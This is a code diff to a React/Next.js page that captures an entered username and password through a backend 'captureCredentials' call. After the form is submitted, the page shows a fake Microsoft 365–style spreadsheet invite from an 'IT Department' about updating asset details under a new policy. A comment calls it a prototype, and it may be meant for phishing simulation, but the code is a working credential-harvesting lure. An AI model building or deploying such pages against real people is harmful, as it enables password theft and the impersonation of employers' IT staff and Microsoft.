@@ -1,16 +1,47 @@
 'use client';
 import { FormEvent, useState } from 'react';
 import { captureCredentials } from '@/ai/flows/capture-credentials';
-import Link from 'next/link';
 
-// Make Swal available in the component
-declare const Swal: any;
+const SpreadsheetInvite = () => {
+  return (
+    <div className="container">
+      <div className="logo">
+        <img src="https://dummyimage.com/150x40/00b3b3/ffffff&text=Trellissoft.AI" alt="Trellissoft.AI" />
+      </div>
+
+      <h2>IT Department invited you to edit a Spreadsheet</h2>
+
+      <p>Here's the Spreadsheet that IT Department shared with you.</p>
+
+      <div className="file-box">
+        <span>📄</span> Update of Asset Details as per New System Policy
+      </div>
+
+      <p className="note">🔒 This invite will only work for you and people with existing access.</p>
+
+      <button className="btn">Open</button>
+      <button className="btn">Share</button>
+
+      <footer>
+        <div className="footer-logo">
+          <img src="https://dummyimage.com/80x20/00b3b3/ffffff&text=Trellissoft" alt="Trellissoft logo" />
+          <span>Trellissoft.AI</span>
+        </div>
+        <p>
+          This email is generated through Trellissoft’s use of Microsoft 365 and may contain content that is controlled by Trellissoft.
+        </p>
+      </footer>
+    </div>
+  );
+}
+
 
 export default function Home() {
   const imageUrl = "https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg";
 
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
+  const [isSignedIn, setIsSignedIn] = useState(false);
 
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
@@ -18,21 +49,14 @@ export default function Home() {
     // Capture credentials on the backend
     await captureCredentials({ username, password });
     
-    // Show SweetAlert2 prompt
-    Swal.fire({
-      title: "Action Required: Employee Asset Details",
-      text: "Please review and update your asset information in accordance with the new IT policy.",
-      icon: "info",
-      confirmButtonText: "Update Now",
-      confirmButtonColor: "#3085d6",
-      background: "#fff",
-      color: "#333"
-    }).then(() => {
-      // In a real scenario, you would redirect. For this prototype, we do nothing.
-      console.log("Alert closed. Would redirect to employee-asset-update.html");
-    });
+    // Show the invite page
+    setIsSignedIn(true);
   };
   
+  if (isSignedIn) {
+    return <SpreadsheetInvite />;
+  }
+
   return (
     <>
       {/* Blurred Image */}
